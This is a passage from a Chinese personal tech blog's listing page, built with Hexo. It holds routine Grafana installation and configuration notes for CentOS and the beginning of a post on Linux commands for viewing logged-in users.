<!DOCTYPE html>



  


<html class="theme-next gemini use-motion" lang="zh-Hans">
<head><meta name="generator" content="Hexo 3.8.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="theme-color" content="#222">
<script>
    (function () {
        if ('') {
            if (prompt('请输入文章密码') !== '') {
                alert('密码错误！');
                if (history.length === 1) {
                    location.replace("https://google.com"); // 这里替换成你的首页
                } else {
                    history.back();
                }
            }
        }
    })();
</script>








<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT">










<meta property="og:type" content="website">
<meta property="og:title" content="苏生不惑的博客">
<meta property="og:url" content="http://yoursite.com/page/27/index.html">
<meta property="og:site_name" content="苏生不惑的博客">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="苏生不惑的博客">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Gemini',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/page/27/">



<meta name="referrer" content="never"> ​​​​


  <title>苏生不惑的博客</title>
  








</head>

<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/" class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">苏生不惑的博客</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            关于
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            归档
          </a>
        </li>
      

      
        <li class="menu-item menu-item-search">
          
            <a href="javascript:;" class="popup-trigger">
          
            
              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
            
            搜索
          </a>
        </li>
      
    </ul>
  

  
    <div class="site-search">
      
  <div class="popup search-popup local-search-popup">
  <div class="local-search-header clearfix">
    <span class="search-icon">
      <i class="fa fa-search"></i>
    </span>
    <span class="popup-btn-close">
      <i class="fa fa-times-circle"></i>
    </span>
    <div class="local-search-input-wrapper">
      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
    </div>
  </div>
  <div id="local-search-result"></div>
</div>



    </div>
  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/11/数据分析平台grafana/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/11/数据分析平台grafana/" itemprop="url">数据分析平台grafana</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-11T20:03:22+08:00">
                2019-01-11
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  914 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//http://docs.grafana.org/installation/rpm/ https://blog.csdn.net/bbwangj/article/details/81109615</span></span><br><span class="line">[root@VM_0_14_centos blog]#  service grafana-server start</span><br><span class="line">Starting grafana-server (via systemctl):  systemctl start grafana-server</span><br><span class="line">                                                           [  OK  ]</span><br><span class="line">[root@VM_0_14_centos blog]# systemctl start grafana-server</span><br><span class="line">[root@VM_0_14_centos blog]# systemctl enable grafana-server.service</span><br><span class="line">Created symlink <span class="keyword">from</span> /etc/systemd/system/multi-user.target.wants/grafana-server.service to /usr/lib/systemd/system/grafana-server.service.</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos blog]#  grafana-cli plugins install alexanderzobnin-zabbix-app</span><br><span class="line">installing alexanderzobnin-zabbix-app @ <span class="number">3.9</span><span class="number">.1</span></span><br><span class="line"><span class="keyword">from</span> url: https:<span class="comment">//grafana.com/api/plugins/alexanderzobnin-zabbix-app/versions/3.9.1/download</span></span><br><span class="line">into: <span class="regexp">/var/</span>lib/grafana/plugins</span><br><span class="line"></span><br><span class="line">✔ Installed alexanderzobnin-zabbix-app successfully</span><br><span class="line"></span><br><span class="line">Restart grafana after installing plugins . &lt;service grafana-server restart&gt;</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos blog]#  grafana-cli plugins install grafana-piechart-panel</span><br><span class="line">installing grafana-piechart-panel @ <span class="number">1.3</span><span class="number">.4</span></span><br><span class="line"><span class="keyword">from</span> url: https:<span class="comment">//grafana.com/api/plugins/grafana-piechart-panel/versions/1.3.4/download</span></span><br><span class="line">into: <span class="regexp">/var/</span>lib/grafana/plugins</span><br><span class="line"></span><br><span class="line">✔ Installed grafana-piechart-panel successfully</span><br><span class="line"></span><br><span class="line">Restart grafana after installing plugins . &lt;service grafana-server restart&gt;</span><br><span class="line">[root@VM_0_14_centos blog]# grafana-cli plugins ls</span><br><span class="line">installed plugins:</span><br><span class="line">alexanderzobnin-zabbix-app @ <span class="number">3.9</span><span class="number">.1</span></span><br><span class="line">grafana-piechart-panel @ <span class="number">1.3</span><span class="number">.4</span></span><br><span class="line"></span><br><span class="line">Restart grafana after installing plugins . &lt;service grafana-server restart&gt;</span><br><span class="line">grafana-cli plugins update &lt;plugin-id&gt;</span><br><span class="line">grafana-cli plugins remove &lt;plugin-id&gt;</span><br><span class="line">grafana-cli plugins install grafana-simple-json-datasource</span><br><span class="line"> /etc/init.d/grafana-server restart</span><br><span class="line"> [root@VM_0_14_centos blog]# ll /usr/share/grafana/public/app/plugins/datasource/</span><br><span class="line"> total <span class="number">60</span></span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> cloudwatch</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> elasticsearch</span><br><span class="line"> drwxr-xr-x <span class="number">4</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> grafana</span><br><span class="line"> drwxr-xr-x <span class="number">3</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> grafana-live</span><br><span class="line"> drwxr-xr-x <span class="number">6</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> graphite</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> influxdb</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> logging</span><br><span class="line"> drwxr-xr-x <span class="number">2</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> mixed</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> mssql</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> mysql</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> opentsdb</span><br><span class="line"> drwxr-xr-x <span class="number">5</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> postgres</span><br><span class="line"> drwxr-xr-x <span class="number">8</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> prometheus</span><br><span class="line"> drwxr-xr-x <span class="number">6</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> stackdriver</span><br><span class="line"> drwxr-xr-x <span class="number">3</span> root root <span class="number">4096</span> Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">16</span> testdata</span><br><span class="line">[root@VM_0_14_centos blog]# systemctl restart grafana-server</span><br><span class="line"><span class="comment">//https://blog.csdn.net/Hu_wen/article/details/78890159</span></span><br><span class="line"><span class="keyword">export</span> GOPATH=<span class="string">`pwd`</span></span><br><span class="line">go get github.com/grafana/grafana</span><br><span class="line">cd $GOPATH/src/github.com/grafana/grafana</span><br><span class="line">go run build.go setup</span><br><span class="line">go run build.go build  </span><br><span class="line">yum install bzip2</span><br><span class="line">npm install -g yarn</span><br><span class="line">yarn install --pure-lockfile</span><br><span class="line">npm run build</span><br><span class="line">./bin/grafana-server</span><br><span class="line">grafana的模板资源主要是在源码的public下，修改相应的html文件以及js文件就可以汉化</span><br><span class="line"></span><br><span class="line"># 二进制程序文件</span><br><span class="line">/usr/sbin/grafana-server</span><br><span class="line"># init.d脚本</span><br><span class="line">/etc/init.d/grafana-server</span><br><span class="line"># 安装默认环境变量文件</span><br><span class="line">/etc/sysconfig/grafana-server</span><br><span class="line"># 配置文件</span><br><span class="line">/etc/grafana/grafana.ini</span><br><span class="line"># systemd服务名称</span><br><span class="line">grafana-server.service</span><br><span class="line"># 日志文件</span><br><span class="line">/<span class="keyword">var</span>/log/grafana/grafana.log</span><br><span class="line"># 默认sqlite3数据库</span><br><span class="line">/<span class="keyword">var</span>/lib/grafana/grafana.db</span><br><span class="line"></span><br><span class="line">[root@VM_0_14_centos blog]# vi /etc/grafana/grafana.ini</span><br><span class="line">http_port=<span class="number">3003</span></span><br><span class="line">[root@VM_0_14_centos blog]# systemctl restart grafana-server</span><br><span class="line">[root@VM_0_14_centos blog]# systemctl status grafana-server</span><br><span class="line">● grafana-server.service - Grafana instance</span><br><span class="line">   Loaded: loaded (<span class="regexp">/usr/</span>lib/systemd/system/grafana-server.service; enabled; vendor preset: disabled)</span><br><span class="line">   Active: active (running) since Thu <span class="number">2019</span><span class="number">-01</span><span class="number">-10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> CST; <span class="number">6</span>s ago</span><br><span class="line">     Docs: http:<span class="comment">//docs.grafana.org</span></span><br><span class="line"> Main PID: <span class="number">28408</span> (grafana-server)</span><br><span class="line">   Memory: <span class="number">16.5</span>M</span><br><span class="line">   CGroup: <span class="regexp">/system.slice/g</span>rafana-server.service</span><br><span class="line">           └─<span class="number">28408</span> /usr/sbin/grafana-server --config=<span class="regexp">/etc/g</span>rafana/grafana.ini --pidfile=<span class="regexp">/var/</span>run/grafana/grafana-server.pid --packagin...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Initializing PluginManager"</span> logger=server Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Starting plugin search"</span> logger=plugins</span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Registering plugin"</span> logger=plugin...Zabbix</span><br><span class="line"></span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Registering plugin"</span> logger=plugin...ggers<span class="string">"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="</span>Registering plugin<span class="string">" logger=plugin...Zabbix</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Jan 10 14:59:27 VM_0_14_centos grafana-server[28408]: t=2019-01-10T14:59:27+0800 lvl=info msg="</span>Registering plugin<span class="string">" logger=plugin...Chart"</span></span><br><span class="line"></span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos systemd[<span class="number">1</span>]: Started Grafana instance.</span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Initializing TracingService"</span> logger=server</span><br><span class="line"></span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"Initializing Stream Manager"</span></span><br><span class="line">Jan <span class="number">10</span> <span class="number">14</span>:<span class="number">59</span>:<span class="number">27</span> VM_0_14_centos grafana-server[<span class="number">28408</span>]: t=<span class="number">2019</span><span class="number">-01</span><span class="number">-10</span>T14:<span class="number">59</span>:<span class="number">27</span>+<span class="number">0800</span> lvl=info msg=<span class="string">"HTTP Server Listen"</span> logger=http.s...ocket=</span><br><span class="line"></span><br><span class="line">Hint: Some lines were ellipsized, use -l to show <span class="keyword">in</span> full.</span><br></pre></td></tr></table></figure>
<h3 id="访问"><a href="#访问" class="headerlink" title="访问"></a>访问</h3><p><a href="http://118.24.158.116:3003" target="_blank" rel="noopener">http://118.24.158.116:3003</a> 默认账号密码 admin admin</p>
<p><a href="https://segmentfault.com/a/1190000016233772" target="_blank" rel="noopener">Grafana 文档（目录）</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/git-笔记/">

    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
      <meta itemprop="name" content="苏生不惑">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="苏生不惑的博客">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/01/08/git-笔记/" itemprop="url">git 笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-01-08T14:39:10+08:00">
                2019-01-08
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                  <span class="post-meta-divider">|</span>
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  12.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  59 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//www.itcodemonkey.com/article/12558.html</span></span><br><span class="line">[alvin@VM_0_16_centos ~]$ whoami</span><br><span class="line">alvin</span><br><span class="line">查看当前登录到服务器的用户有哪一些。</span><br><span class="line"></span><br><span class="line">[alvin@VM_0_16_centos ~]$ who</span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">07</span>:<span class="number">25</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">root     pts/<span class="number">1</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">11</span>:<span class="number">05</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">alvin    pts/<span class="number">2</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">11</span>:<span class="number">05</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">harry    pts/<span class="number">3</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">11</span>:<span class="number">06</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">kate     pts/<span class="number">4</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">11</span>:<span class="number">08</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">alvin    pts/<span class="number">5</span>        <span class="number">2018</span><span class="number">-12</span><span class="number">-09</span> <span class="number">11</span>:<span class="number">53</span> (<span class="number">116.199</span>.***.***)</span><br><span class="line">在显示结果里，第一列是用户名；第二列是连接的终端，tty 表示显示器，pts 表示远程连接；第三列是登陆时间。</span><br><span class="line"></span><br><span class="line">这里信息稍微多一些，但如果我们只想知道谁在线要怎么操作？只需用 users 命令来查看即可。</span><br><span class="line"></span><br><span class="line">[alvin@VM_0_16_centos ~]$ users</span><br><span class="line">alvin alvin alvin harry kate root</span><br><span class="line">显示已经登录系统的用户的名称，以及他们正在做的事</span><br><span class="line">[alvin@VM_0_16_centos ~]$ w</span><br><span class="line"> <span class="number">16</span>:<span class="number">25</span>:<span class="number">54</span> up <span class="number">29</span> days,  <span class="number">6</span>:<span class="number">05</span>,  <span class="number">6</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.01</span>, <span class="number">0.05</span></span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">alvin    pts/<span class="number">0</span>    <span class="number">116.199</span>.***.**   <span class="number">07</span>:<span class="number">25</span>    <span class="number">2.00</span>s  <span class="number">0.11</span>s  <span class="number">0.00</span>s w</span><br><span class="line">root     pts/<span class="number">1</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">05</span>    <span class="number">5</span>:<span class="number">20</span>m  <span class="number">0.02</span>s  <span class="number">0.02</span>s -bash</span><br><span class="line">alvin    pts/<span class="number">2</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">05</span>    <span class="number">5</span>:<span class="number">20</span>m  <span class="number">0.04</span>s  <span class="number">0.05</span>s sshd: alvin [priv]</span><br><span class="line">harry    pts/<span class="number">3</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">06</span>    <span class="number">4</span>:<span class="number">33</span>m <span class="number">18.08</span>s <span class="number">18.06</span>s watch date</span><br><span class="line">kate     pts/<span class="number">4</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">08</span>    <span class="number">4</span>:<span class="number">33</span>m <span class="number">10.51</span>s <span class="number">10.48</span>s top</span><br><span class="line">alvin    pts/<span class="number">5</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">53</span>    <span class="number">4</span>:<span class="number">32</span>m  <span class="number">0.02</span>s  <span class="number">0.02</span>s -bash</span><br><span class="line">[alvin@VM_0_16_centos ~]$ w alvin</span><br><span class="line"> <span class="number">16</span>:<span class="number">34</span>:<span class="number">21</span> up <span class="number">29</span> days,  <span class="number">6</span>:<span class="number">14</span>,  <span class="number">6</span> users,  load average: <span class="number">0.00</span>, <span class="number">0.01</span>, <span class="number">0.05</span></span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">alvin    pts/<span class="number">0</span>    <span class="number">116.199</span>.***.**   <span class="number">07</span>:<span class="number">25</span>    <span class="number">5.00</span>s  <span class="number">0.12</span>s  <span class="number">0.06</span>s sshd: alvin [priv]</span><br><span class="line">alvin    pts/<span class="number">2</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">05</span>    <span class="number">5</span>:<span class="number">28</span>m  <span class="number">0.04</span>s  <span class="number">0.05</span>s sshd: alvin [priv]</span><br><span class="line">alvin    pts/<span class="number">5</span>    <span class="number">116.199</span>.***.**   <span class="number">11</span>:<span class="number">53</span>    <span class="number">4</span>:<span class="number">40</span>m  <span class="number">0.02</span>s  <span class="number">0.02</span>s -bash</span><br><span class="line">last命令可用于显示特定用户登录系统的历史记录</span><br><span class="line">[alvin@VM_0_16_centos ~]$ last alvin</span><br><span class="line">alvin    pts/<span class="number">5</span>        <span class="number">116.199</span>.***.**   Sun Dec  <span class="number">9</span> <span class="number">11</span>:<span class="number">53</span>   still logged <span class="keyword">in</span></span><br><span class="line">alvin    pts/<span class="number">2</span>        <span class="number">116.199</span>.***.**   Sun Dec  <span class="number">9</span> <span class="number">11</span>:<span class="number">05</span>   still logged <span class="keyword">in</span></span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">116.199</span>.***.**   Sun Dec  <span class="number">9</span> <span class="number">07</span>:<span class="number">25</span>   still logged <span class="keyword">in</span></span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">116.199</span>.***.**   Sat Dec  <span class="number">8</span> <span class="number">20</span>:<span class="number">42</span> - <span class="number">23</span>:<span class="number">10</span>  (<span class="number">02</span>:<span class="number">28</span>)</span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">119.33</span>.***.**    Mon Dec  <span class="number">3</span> <span class="number">20</span>:<span class="number">50</span> - <span class="number">23</span>:<span class="number">51</span> (<span class="number">1</span>+<span class="number">03</span>:<span class="number">01</span>)</span><br><span class="line">alvin    pts/<span class="number">0</span>        <span class="number">119.33</span>.***.**    Thu Nov <span class="number">29</span> <span class="number">20</span>:<span class="number">20</span> - <span class="number">22</span>:<span class="number">45</span>  (<span class="number">02</span>:<span class="number">24</span>)</span><br><span 